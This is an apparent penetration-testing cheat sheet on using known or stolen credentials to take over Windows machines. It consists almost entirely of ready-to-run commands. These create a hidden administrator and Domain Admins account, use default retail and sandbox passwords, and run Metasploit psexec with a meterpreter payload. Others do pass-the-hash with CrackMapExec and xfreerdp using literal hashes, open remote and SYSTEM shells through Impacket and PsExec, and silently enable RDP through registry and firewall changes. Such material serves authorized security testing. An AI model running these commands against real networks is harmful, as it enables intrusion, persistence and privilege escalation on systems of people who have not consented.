# Windows - Using credentials

## Summary

* [TIPS](#tips)
    * [TIP 1 - Create your credential](#tip-1-create-your-credential)
    * [TIP 2 - Retail Credential](#tip-2-retail-credential)
    * [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
* [Metasploit](#metasploit)
    * [Metasploit - SMB](#metasploit-smb)
    * [Metasploit - Psexec](#metasploit-psexec)
* [Crackmapexec](#crackmapexec)
* [Winexe](#winexe)
* [WMI](#wmi)
* [Psexec.py / Smbexec.py / Wmiexec.py](#psexec.py---smbexec.py---wmiexec.py)
* [PsExec - Sysinternal](#psexec-sysinternal)
* [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
* [Netuse](#netuse)
* [Runas](#runas)

## TIPS

### TIP 1 - Create your credential

```powershell
net user hacker hacker1234* /add
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add # RDP access
net localgroup "Backup Operators" hacker /add # Full access to files
net group "Domain Admins" hacker /add /domain
```

Some info about your user

```powershell
net user /dom
net user /domain
```

### TIP 2 - Retail Credential 

Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)

when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin

```powershell
Username: RetailAdmin
Password: trs10
```

### TIP 3 - Sandbox Credential - WDAGUtilityAccount

WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)

Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard

```powershell
\\windowssandbox
Username: wdagutilityaccount
Password: pw123
```


## Metasploit

### Metasploit - SMB

```c
use auxiliary/scanner/smb/smb_login  
set SMBDomain DOMAIN  
set SMBUser username
set SMBPass password
services -p 445 -R  
run
creds
```

### Metasploit - Psexec

Note: the password can be replaced by a hash to execute a `pass the hash` attack.

```c
use exploit/windows/smb/psexec
set RHOST 10.2.0.3
set SMBUser username
set SMBPass password
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```

## Crackmapexec

```python
git clone https://github.com/byt3bl33d3r/CrackMapExec.github
python crackmapexec.py 10.9.122.0/25 -d DOMAIN -u username -p password
python crackmapexec.py 10.10.10.10 -d DOMAIN -u username -p password -x whoami
# pass the hash
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5509de4ff0a6eed7048d9f4a61100e51' --local-auth
```

## Winexe 

Integrated to Kali

```python
winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
```

## WMI

```powershell
wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
```

## Psexec.py / Smbexec.py / Wmiexec.py 

from Impacket

```python
git clone https://github.com/CoreSecurity/impacket.git
python psexec.py DOMAIN/username:password@10.10.10.10
python smbexec.py DOMAIN/username:password@10.10.10.10
python wmiexec.py DOMAIN/username:password@10.10.10.10

# psexec.exe -s cmd
# switch admin user to NT Authority/System
```

## PsExec - Sysinternal

from Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

```powershell
PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s  # get System shell
```

## RDP Remote Desktop Protocol 

Abuse RDP protocol to execute commands remotely with [SharpRDP](https://github.com/0xthirteen/SharpRDP)

```powershell
SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
```

Or connect remotely with `rdesktop`

```powershell
rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
rdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10
# -g : the screen will take up 70% of your actual screen size
# -r disk:share : sharing a local folder during a remote desktop session 
```

Note: you may need to enable it with the following command

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

or with psexec(sysinternals)

```powershell
psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
```

or with crackmapexec

```powershell
crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```

or with Metasploit

```powershell
run getgui -u admin -p 1234
```

or with xfreerdp 

```powershell
xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129 # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
xfreerd /u:runner /v:10.0.0.1 # password will be asked
```

## Netuse 

Windows only

```powershell
net use \\ordws01.cscou.lab /user:DOMAIN\username password
C$
```

## Runas 

```powershell
runas /netonly /user:DOMAIN\username "cmd.exe"
runas /noprofil /netonly /user:DOMAIN\username cmd.exe
```

## References

- [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
